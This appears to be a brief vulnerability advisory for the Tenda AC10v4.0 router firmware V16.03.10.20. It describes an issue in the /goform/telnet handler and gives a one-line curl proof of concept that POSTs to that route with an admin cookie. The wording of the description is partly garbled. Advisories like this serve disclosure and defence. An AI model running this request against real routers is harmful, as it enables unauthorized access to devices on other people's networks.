# TendaAC10v16.03.10.20telnet

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103684

## Affected version

AC10v4.0 V16.03.10.20

## Vulnerability details

An issue was discovered in AC10v4.0 V16.03.10.20 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![1736439948488](/img/1736439948488.png)

## POC

```python
curl -i -X POST http://192.168.1.100/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![1736440027143](/img/1736440027143.png)

